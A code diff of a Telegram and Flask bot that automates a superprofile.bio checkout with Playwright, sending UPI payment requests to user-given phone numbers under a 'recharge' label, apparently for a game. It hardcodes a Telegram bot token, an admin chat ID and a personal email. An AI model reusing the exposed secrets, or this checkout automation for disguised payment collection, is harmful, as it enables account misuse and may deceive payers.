@@ -11,30 +11,15 @@ app = Flask('')
 TOKEN = '7510297537:AAEeCr_pl4CndrNCpBpr7Ac8mL3jlFKpyRk'
 URL = "https://superprofile.bio/vp/6994a964b7a14d00133409f7"
 
-def get_admin_id():
-    try:
-        with open("admin_chat_id.txt", "r") as f:
-            return f.read().strip()
-    except:
-        return None
-
-def save_admin_id(chat_id):
-    try:
-        with open("admin_chat_id.txt", "w") as f:
-            f.write(str(chat_id))
-    except:
-        pass
+# നിങ്ങളുടെ ടെലിഗ്രാം ഐഡി ഇവിടെ സ്ഥിരമായി നൽകിയിട്ടുണ്ട്. ഇനി /start അടിക്കേണ്ടതില്ല!
+ADMIN_CHAT_ID = "1048415011" 
 
 def send_msg(text):
-    chat_id = get_admin_id()
-    if chat_id:
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={'chat_id': chat_id, 'text': text})
+    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={'chat_id': ADMIN_CHAT_ID, 'text': text})
 
 def send_photo(photo_path, caption):
-    chat_id = get_admin_id()
-    if chat_id:
-        with open(photo_path, 'rb') as f:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={'chat_id': chat_id, 'caption': caption}, files={'photo': f})
+    with open(photo_path, 'rb') as f:
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={'chat_id': ADMIN_CHAT_ID, 'caption': caption}, files={'photo': f})
 
 async def playwright_task(user_upi_id):
     send_msg(f"⏳ ഡീറ്റെയിൽസ് എന്റർ ചെയ്യുന്നു... (നമ്പർ: {user_upi_id})")
@@ -45,37 +30,34 @@ async def playwright_task(user_upi_id):
             browser_context = await browser.new_context(viewport={'width': 1366, 'height': 768})
             page = await browser_context.new_page()
             
-            # (മാറ്റം 1) പേജ് വേഗത്തിൽ ലോഡ് ആകാനുള്ള കമാൻഡ്
             await page.goto(URL, wait_until="domcontentloaded", timeout=60000)
-            await asyncio.sleep(2) # 4 സെക്കൻഡ് എന്നത് 2 ആക്കി കുറച്ചു
+            await asyncio.sleep(2) 
             
-            # 1. ഇമെയിൽ നൽകുന്നു (പഴയ വർക്കിംഗ് രീതി തന്നെ)
+            # 1. ഇമെയിൽ നൽകുന്നു
             all_inputs = page.locator('input')
             await all_inputs.first.wait_for(state="visible", timeout=15000)
             await all_inputs.first.click(force=True)
-            # (മാറ്റം 2) ടൈപ്പിങ് സ്പീഡ് കൂട്ടി (delay 50 ൽ നിന്നും 20 ആക്കി)
             await page.keyboard.type("sanjuchacko628@gmail.com", delay=20)
             
-            await asyncio.sleep(1) # 2 സെക്കൻഡ് 1 ആക്കി കുറച്ചു
+            await asyncio.sleep(1)
             
             # 2. Get it now ക്ലിക്ക് ചെയ്യുന്നു 
             get_btn = page.locator('button.checkout-proceed-cta')
             await get_btn.last.click(force=True)
             
             send_msg("⏳ പെയ്‌മെന്റ് ഗേറ്റ്‌വേയിലേക്ക് കണക്ട് ചെയ്യുന്നു...")
-            await asyncio.sleep(3) # 6 സെക്കൻഡ് കാത്തിരിപ്പ് 3 ആക്കി കുറച്ചു
+            await asyncio.sleep(3) 
             
             # 3. UPI ഓപ്ഷൻ ക്ലിക്ക് ചെയ്യുന്നു 
             await page.locator('text="UPI"').last.click(force=True)
-            await asyncio.sleep(1.5) # 3 സെക്കൻഡ് 1.5 ആക്കി കുറച്ചു
+            await asyncio.sleep(1.5) 
             
-            # 4. കൃത്യമായി മൊബൈൽ നമ്പർ നൽകുന്നു (രണ്ടാമത്തെ ബോക്സിൽ)
+            # 4. കൃത്യമായി മൊബൈൽ നമ്പർ നൽകുന്നു
             upi_input = page.locator('input[placeholder*="Mobile No."]').last
             await upi_input.click(force=True)
-            # (മാറ്റം 3) നമ്പറും വേഗത്തിൽ ടൈപ്പ് ചെയ്യുന്നു
             await page.keyboard.type(user_upi_id, delay=30)
             
-            await asyncio.sleep(2) # 4 സെക്കൻഡ് 2 ആക്കി കുറച്ചു
+            await asyncio.sleep(2) 
             
             try:
                 verify_link = page.locator('text="Verify"').last
@@ -104,7 +86,7 @@ async def playwright_task(user_upi_id):
             await page.screenshot(path="timer.png")
             send_photo("timer.png", f"✅ നിങ്ങളുടെ നമ്പറിലേക്ക് ( {user_upi_id} ) പെയ്‌മെന്റ് റിക്വസ്റ്റ് അയച്ചിട്ടുണ്ട്!\n\nദയവായി നിങ്ങളുടെ ആപ്പ് തുറന്ന് 8 മിനിറ്റിനുള്ളിൽ പെയ്‌മെന്റ് പൂർത്തിയാക്കുക.")
             
-            # 8. പെയ്‌മെന്റ് സക്സസ് ആകാൻ സ്കാൻ ചെയ്യുന്നു (ഓരോ 2 സെക്കൻഡിലും)
+            # 8. പെയ്‌മെന്റ് സക്സസ് ആകാൻ സ്കാൻ ചെയ്യുന്നു 
             payment_success = False
             for _ in range(240):
                 await asyncio.sleep(2) 
@@ -136,25 +118,21 @@ def run_pw_thread(user_upi_id):
 def api_recharge(mobile_number):
     if not re.fullmatch(r'\d{10}', mobile_number):
         return jsonify({"status": "error", "message": "Invalid mobile number"}), 400
-    if not get_admin_id():
-        return jsonify({"status": "error", "message": "Admin chat ID not set. Send any message to bot in Telegram first."}), 400
         
     Thread(target=run_pw_thread, args=(mobile_number,)).start()
     return jsonify({"status": "success", "message": f"Recharge process started for {mobile_number}"})
 
 @app.route('/')
-def home(): return "UPI Request API Bot is Running!"
+def home(): return "UPI Request API Bot is Running 24/7!"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    save_admin_id(update.message.chat_id)
-    await update.message.reply_text("✅ ബോട്ടിലേക്ക് കണക്ട് ചെയ്തു! ഇനി ഗെയിമിൽ നിന്നോ നേരിട്ടോ റീചാർജ് ചെയ്യാം.")
+    await update.message.reply_text("✅ ബോട്ട് 24/7 ലൈവ് ആണ്! ഇനി /start അടിക്കേണ്ട ആവശ്യമില്ല.")
 
 async def handle_direct_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    save_admin_id(update.message.chat_id)
     user_text = update.message.text.strip()
     if re.fullmatch(r'\d{10}', user_text):
         Thread(target=run_pw_thread, args=(user_text,)).start()
@@ -166,5 +144,5 @@ if __name__ == '__main__':
     application = ApplicationBuilder().token(TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_number))
-    print("UPI Request Bot is Starting...")
+    print("UPI Request Bot is Starting with 24/7 config...")
     application.run_polling()
